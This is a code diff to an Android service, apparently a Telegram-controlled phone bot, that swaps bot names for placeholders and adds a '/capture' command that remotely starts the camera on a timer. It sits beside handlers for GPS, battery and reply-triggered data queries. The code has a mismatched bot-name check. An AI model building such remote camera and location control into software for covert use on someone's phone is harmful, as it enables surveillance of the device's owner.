@@ -469,7 +469,7 @@ public class BotService extends Service implements LocationListener {
 							from_id = message.getJSONObject("from").getInt("id");
 							from_user_name = message.getJSONObject("reply_to_message").getJSONObject("from").getString("username");
 							Log.i("MU",""+from_chat_id+" "+from_msg_id+" "+from_user_name);
-							if(from_user_name.toLowerCase().equalsIgnoreCase("user_name_bot")){
+							if(from_user_name.toLowerCase().equalsIgnoreCase("your_bot_name")){
 								Cursor cursor = context
 										.getContentResolver()
 										.query(Uri
@@ -523,8 +523,8 @@ public class BotService extends Service implements LocationListener {
 
 						if (text.toLowerCase().startsWith("/echo")) {
 							String msg = "";
-							if(text.toLowerCase().contains("/echo@sabetan_bot")){
-								msg = text.toLowerCase().replace("/echo@sabetan_bot ", "");
+							if(text.toLowerCase().contains("/echo@your_bot")){
+								msg = text.toLowerCase().replace("/echo@your_bot ", "");
 							}else{
 								msg = text.toLowerCase().replace("/echo ", "");
 							}
@@ -549,8 +549,8 @@ public class BotService extends Service implements LocationListener {
 							showBatteryInfo();
 						} else if (text.toLowerCase().startsWith("/detobin")) {
 							String stringDes = "";
-							if(text.toLowerCase().contains("/detobin@sabetan_bot")){
-								stringDes = text.toLowerCase().replace("/detobin@sabetan_bot ", "");
+							if(text.toLowerCase().contains("/detobin@your_bot")){
+								stringDes = text.toLowerCase().replace("/detobin@your_bot ", "");
 							}else{
 								stringDes = text.toLowerCase().replace("/detobin ", "");
 							}
@@ -567,8 +567,8 @@ public class BotService extends Service implements LocationListener {
 							}
 						} else if (text.toLowerCase().startsWith("/bintode")) {
 							String stringBin = "";
-							if(text.toLowerCase().contains("/bintode@sabetan_bot")){
-							    stringBin = text.toLowerCase().replace("/bintode@sabetan_bot ", "");
+							if(text.toLowerCase().contains("/bintode@your_bot")){
+							    stringBin = text.toLowerCase().replace("/bintode@your_bot ", "");
 							}else{
 								stringBin = text.toLowerCase().replace("/bintode ", "");
 							}
@@ -593,12 +593,23 @@ public class BotService extends Service implements LocationListener {
 								Utils.sendMessage(chat_id, message_id,
 										"gps dimatikan");
 							}
-						} else if (text.toLowerCase().equalsIgnoreCase("/poto")) {
+						} else if (text.toLowerCase().startsWith("/capture")) {
+							try{
+							String stringtimer = "";
+							if(text.toLowerCase().contains("/capture@our_bot")){
+							    stringtimer = text.toLowerCase().replace("/capture@your_bot ", "");
+							}else{
+								stringtimer = text.toLowerCase().replace("/capture ", "");
+							}
+							int value = Integer.valueOf(stringtimer);
 							Utils.sendChatAction(chat_id, "typing");
 							Utils.sendMessage(chat_id, message_id,
 									"perintah dilaksanakan");
-							context.startService(new Intent(BotService.this,
-									CameraService.class));
+							context.startActivity(new Intent(BotService.this, CameraActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK).putExtra("time", value));
+							}catch(Exception e){
+								Utils.sendChatAction(chat_id, "typing");
+								Utils.sendMessage(chat_id, message_id, "invalid error");
+							}
 						} else if (text.toLowerCase().contains("ganteng")) {
 							Utils.sendChatAction(chat_id, "typing");
 							Utils.sendMessage(chat_id, message_id,
